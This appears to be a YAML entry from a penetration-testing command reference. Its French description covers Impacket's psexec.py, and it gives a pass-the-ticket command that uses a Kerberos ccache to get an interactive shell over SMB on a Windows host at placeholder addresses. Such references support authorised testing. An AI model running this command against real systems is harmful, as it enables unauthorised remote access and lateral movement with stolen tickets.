---
description: |
  Le fichier psexec.py d'Impacket offre des fonctionnalités similaires à celles de psexec. Cela vous donnera un shell interactif sur l'hôte Windows. psexec.py permet également d'utiliser les tickets de service, sauvegardés dans un fichier ccache pour l'authentification. Il peut être obtenu via le fichier GetST.py d'Impacket.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

command: |
  export KRB5CCNAME=/full/path/to/john.ccache; python3 psexec.py test.local/john@10.10.10.1 -k -no-pass
items:
  - TGS
  - Username
services:
  - SMB
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
  - https://www.sans.org/blog/psexec-python-rocks/
  - https://book.hacktricks.xyz/windows/active-directory-methodology/pass-the-ticket#pass-the-ticket-attack
---
